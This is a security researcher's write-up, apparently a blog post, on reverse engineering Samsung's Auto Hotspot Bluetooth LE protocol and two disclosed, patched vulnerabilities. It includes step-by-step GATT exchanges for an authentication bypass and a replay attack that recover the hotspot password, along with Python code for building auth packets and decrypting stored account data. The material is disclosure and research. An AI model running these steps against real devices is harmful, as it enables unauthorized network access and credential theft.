# Introduction

After buying a Samsung S23 Ultra there was a new addition to the WiFi list on my Samsung Tab S7+. A new list called “Auto Hotspot” showed “Erik’s S23 Ultra”. Pressing this element turns on Mobile Hotspot on my S23 Ultra and connect my Tab S7+ to it. Where did this come from? How does my tablet learn the password? How is this implemented?

Not able to find any previous research on Auto Hotspot, I put on my RE-hat and went off.

This ended up as SVE-2023-1685 (CVE-2024-20815, CVE-2024-20816) on https://security.samsungmobile.com/securityUpdate.smsb?year=2024&month=02.

# How it works for the user

Auto Hotspot has 3 forms of authentication. 

- Devices that are signed in to your Samsung account
- Devices that are signed in to a Samsung account part of your Family
- Devices that are added to your Family Group

Auto Hotspot devices are shown in the wifi list. Selecting it in the list will turn on the Mobile Hotspot on the target device, negotiate credentials and connect to the target device.

# What could I exploit

## mUsertype 1 (CST) AES authentication can be bypassed. (https://nvd.nist.gov/vuln/detail/CVE-2024-20815)

The implementation of CHARACTERISTIC_ENCRYPTED_AUTH_ID in com.samsung.android.server.wifi.ap.smarttethering.SemWifiApSmartGattServer initially takes mUsertype from this.mClientConnections:

```
this.mVersion = this.mClientConnections.get(device.getAddress()).mVersion;
this.mUserType = this.mClientConnections.get(device.getAddress()).mUserType;
String mAESKey = this.mClientConnections.get(device.getAddress()).mAESKey;
if (this.mVersion == 1) {
  if (this.mUserType == 1) {
    StringBuilder var12 = new StringBuilder();
    var12.append("Using AES:");
```
But after verifying the packet, it takes the mUsertype from the first byte of the AUTH_ID:
```
if (auth_id_valid) {
  this.mUsertype = value[0];
  int offset = value[1];
  String var179 = new String(value, 2, offset);
  this.mAuthDevices.put(device.getAddress(), var223);
  ...
  if (this.mUsertype == 1) {
```

By authenticating with MHS_VER=0x0102, but crafting AUTH_ID with mUsertype 1, AES with mUsertype can be bypassed and authentication with only knowledge of the users GUID and without knowledge of the users AES key can be performed.

Example:

```
1. Read  [MHS_SIDE_GET_TIME]: b'1694987600737'
2. Write [MHS_VER_UPDATE]: written: b'\x01\x02'
3. Write [NOTIFY_MHS_ENABLED]: written
4. Write [MHS_ENCRYPTED_AUTH_ID]: written: bytearray(b'\x01\n$MY_GUID\x08Eriks-S9\x1$MY_MAC\x03\x02\x01\x06\x06\x06\x06\x06\x06')
5. Read  [AUTH_STATUS]: b"\x01\x17Erik's Galaxy S23 Ultra\x19SamsungReverseEngineering\x00xx:xx:xx\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
```

## mUsertype 1 (CST) can be replayed and AES confidentiality bypassed. (https://nvd.nist.gov/vuln/detail/CVE-2024-20816)

mUsertype 1 does not use Bluetooth encryption, so it can be sniffed or MitMed.
And AUTH_STATUS provides plaintext if MHS_VER is switched after authentication.

Together, this allows replaying the sniffed authentication and then requesting the AUTH_STATUS in plaintext.

```
1. Read  [MHS_SIDE_GET_TIME]: b'1694943365972'
2. Write [MHS_VER_UPDATE]: written: b'\x01\x01'
3. Write [NOTIFY_MHS_ENABLED]: written
4. Write [MHS_ENCRYPTED_AUTH_ID]: written: b'$BASE64_ENCODED_STRING'
5. Read  [AUTH_STATUS]: b'$BASE64_ENCODED_RESPONSE'
6. Write [MHS_VER_UPDATE]: written: b'\x01\x02'
7. Read  [AUTH_STATUS]: b"\x01\x17Erik's Galaxy S23 Ultra\x19SamsungReverseEngineering\x00xx:xx:xx\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
8. Parse [AUTH_STATUS]: {'MHSMAC': b'xx:xx:xx', 'password': b'SamsungReverseEngineering', 'SSID': b"Erik's Galaxy S23 Ultra"}
```

Line 4 shows a sniffed encrypted AUTH_ID replayed.
Line 5 shows an encrypted AUTH_STATUS.
Line 6 shows MHS_VER changing to mUsertype 2.
Line 7 shows plaintext AUTH_STATUS.

# Samsung timeline

- 2023-09-18 Shared my report with Samsung
- 2023-09-19 Samsung replies a Security Analyst is assigned
- 2023-10-02 I add more details
- 2023-10-20-2023-11-10 Back and forth with Samsung
- 2023-12-04 Samsung is preparing the patch with their development team
- 2024-01-08 Samsung confirms vulnerability and concludes severity is High.
- 2024-02-06 Samsung awards monetary reward

# Side-notes

Currently, August 2024, Auto Hotspot is broken when Secure Folder is also active. As soon as WiFi list is enabled on your secondary device, Auto Hotspot turns off on the Auto Hotspot device. Solution is to uninstall “Secure Folder” on the “Auto Hotspot” device. 

[Auto hotspot turning off : r/GalaxyS23 (reddit.com)](https://www.reddit.com/r/GalaxyS23/comments/1bs8rid/comment/l7ct2ts/)

# Curiousities

## AES

For GUID authentication AES keys, 64-byte strings are distributed, in the form of “deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef”. These are used by the encryption function by encoding the string as bytes, taking a SHA-1 hash of these bytes and using the first 16-bytes of this hash. Rather than parsing them as hex.

```
MODE_ECB = 1
def MHS.AES.encrypt(plaintext: bytes, key: str) -> bytes:
  keyhash = hashlib.sha1(key.encode('UTF-8')).digest()
  cipher = aes(keyhash[:16], MODE_ECB)
  ciphertext = cipher.encrypt(plaintext)
  return ciphertext
```

## Storage

Data is stored in content://com.samsung.android.wifi.softap/softapInfo, sometimes aes-encrypted with the samsung account derived as key:

```
def decode_aes(value: bytes, key: str) -> str:
    keyhash = hashlib.sha1(key.encode('UTF-8')).digest()
    cipher = AES.new(keyhash[:16], AES.MODE_ECB)
    decryptedBytes = cipher.decrypt(value)
    paddingByte = decryptedBytes[-1:]
    padding = int.from_bytes(paddingByte)
    while padding > 1 and decryptedBytes[-1:] == paddingByte:
        decryptedBytes = decryptedBytes[:-1]
        padding = padding - 1

    decrypted = decryptedBytes.decode('utf-8')
    return decrypted.rsplit(NULL_BYTE, 1)[0]
    
def adbSoftAp(key, username):
    b64ciphertext = query(key)
    ciphertext = base64.b64decode(b64ciphertext)
    return decode_aes(ciphertext, username)
```

"smart_tethering_family_user_names", "smart_tethering_family_guids", "smart_tethering_familyid", "smart_tethering_ownerid", "smart_tethering_guid", "smart_tethering_user_name” are stored encrypted in this fashion. “smart_tethering_AES_keys” is not.

## Hash

Probes contain a hash of your guid or family ID. Auto Hotspot uses basically the Java hashCode function for this, but 64-bit instead of 32-bit.
The hash function works by iterating over the input string, multiplying the previous value by 31, adding the ascii code of the current character and wrapping around a 64-bit signed value.

```
def genSamsungMHSHash(value):
    hash = 0
    long_max_value = (2 ** 63) - 1
    long_min_value = -(2 ** 63)
    long_total = (2 ** 64)

    for char in value:
        hash = (hash * 31) + ord(char)
        while hash > long_max_value:
            hash -= long_total
        while hash < long_min_value:
            hash += long_total

    return hash
```

# Various Bluetooth LE notes

## mUsertype

mUsertype 1 (CST) has your Samsung Account logged in devices obtain a list of AES keys and timestamps synchronized.  
mUsertype 2 and 3 is not entirely sure.

## BLE EIR

Auto Hotspot uses BLE EIR for discovery. packet type: 01 probe. 02 response.  
```| BLE EIR header | Samsung VID | MHS header | hash_guid | hash_family_id | packet_type | _mhs_mac | 27 01 01 | 00 00 00 00 00 00 00 |```

## BLE UUIDs
```
SERVICE_UUID = bluetooth.UUID("7c7bcc5e-27a2-11e9-ab14-d663bd873d93");

CHARACTERISTIC_AUTH_STATUS = bluetooth.UUID("7c7bdb04-27a2-11e9-ab14-d663bd873d93")
CHARACTERISTIC_CLIENT_MAC = bluetooth.UUID("369a01a7-fcd9-48ad-b642-11e93092d3d4")
CHARACTERISTIC_FAMILY_ID = bluetooth.UUID("c6c333ec-4e53-407c-b00a-20dd347fe8fd")
CHARACTERISTIC_GET_WIFI_CONNECTION_DETAILS = bluetooth.UUID("ce56c592-2951-11ed-a261-0242ac120002")
CHARACTERISTIC_GET_WIFI_CONNECTION_PASSWORD_DETAILS = bluetooth.UUID("4f4b8fd2-2ba2-11ed-a261-0242ac120002")
CHARACTERISTIC_ENCRYPTED_AUTH_ID = bluetooth.UUID("7c7bd829-27a2-11e9-ab14-d663bd873d93")
CHARACTERISTIC_MHS_BOND_STATUS = bluetooth.UUID("7c7bdb04-27b2-11e9-ab14-d663bd873d93")
CHARACTERISTIC_MHS_SIDE_GET_TIME = bluetooth.UUID("c323b908-f4f9-11e9-802a-5aa538984bd8")
CHARACTERISTIC_MHS_STATUS_UUID = bluetooth.UUID("7c7bd820-27a2-11e9-ab14-d663bd873d93")
CHARACTERISTIC_MHS_VER_UPDATE = bluetooth.UUID("c323b4e4-f4f9-11e9-802a-5aa538984bd8")
CHARACTERISTIC_NOTIFY_MHS_ENABLED = bluetooth.UUID("7f7cdbf4-27a2-11f9-ab14-d663bd873d93")
```

## Discovery

Client send out BLE EIR advertising frames with packet_type set to 01 for probe.

Server replies with BLE EIR with packet_type set to 02 for response.

## Connection

### Client reads MHS_SIDE_GET_TIME.

Returns ascii string of epoch. To synchronize AES KEY usage between client and server.

AES keys for mUsertype 1 are stored in smart_tethering_AES_keys as a list of timestamps and AES keys:
```
name=smart_tethering_AES_keys, value=1727017001786
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
1729609001786
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
1732287401786
cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
1734879401786
dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
1737557801786
eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
```

### Client writes MHS_VER_UPDATE.
```
| mVersion | mUsertype |

mVersion = 0x01
mUsertype =
  0x01 = GUID auth
  0x02 = family auth
  0x03 = d2d auth
```

### Client writes NOTIFY_MHS_ENABLED

FIXME: test if can do without?

### Client writes ENCRYPTED_AUTH_ID

There’s three types:

```
def create_AUTH_ID(guid, hostname, macaddr):
    AUTH_BYTES = bytearray()
    AUTH_BYTES += b'\x01\n'
    AUTH_BYTES += guid.encode('utf-8')
    AUTH_BYTES += bytes([len(hostname)])
    AUTH_BYTES += hostname.encode('utf-8')
    AUTH_BYTES += bytes([len(macaddr)])
    AUTH_BYTES += macaddr.encode('utf-8')
    AUTH_BYTES += b'\x03\x02\x01\x06\x06\x06\x06\x06\x06'

    return AUTH_BYTES

def create_AUTH_ID_family(family_id, hostname, macaddr, guid):
    AUTH_BYTES = bytearray()
    AUTH_BYTES += b'\x02'
    AUTH_BYTES += bytes([len(family_id)])
    AUTH_BYTES += family_id.encode('utf-8')
    AUTH_BYTES += bytes([len(hostname)])
    AUTH_BYTES += hostname.encode('utf-8')
    AUTH_BYTES += bytes([len(macaddr)])
    AUTH_BYTES += macaddr.encode('utf-8')
    AUTH_BYTES += b'\n'
    AUTH_BYTES += guid.encode('utf-8')
    AUTH_BYTES += b'\x03\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    
    return AUTH_BYTES

def create_AUTH_ID_d2d(family_id, hostname, macaddr):
    AUTH_BYTES = bytearray()
    AUTH_BYTES += b'\x03'
    AUTH_BYTES += bytes([len(family_id)])
    AUTH_BYTES += family_id.encode('utf-8')
    AUTH_BYTES += bytes([len(hostname)])
    AUTH_BYTES += hostname.encode('utf-8')
    AUTH_BYTES += bytes([len(macaddr)])
    AUTH_BYTES += macaddr.encode('utf-8')
    AUTH_BYTES += b'\x03\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    
    return bytes(AUTH_BYTES)
```
GUID authentication gets encrypted with AES and BASE64 encoded before transmission:
```
AUTH_ID_crypted = MHS.AES.encrypt(bytes(AUTH_ID), AESkey)
AUTH_BYTES = base64.b64encode(AUTH_ID_crypted)
```
family and d2d authentication rely on Bluetooth encryption.

### Client reads AUTH_STATUS
```
0xc8 length, filled with 0x0.

| 01 | SSID length | SSID | SSID password length | SSID password | \x00 | mWifiMac | \x00 until end |
```
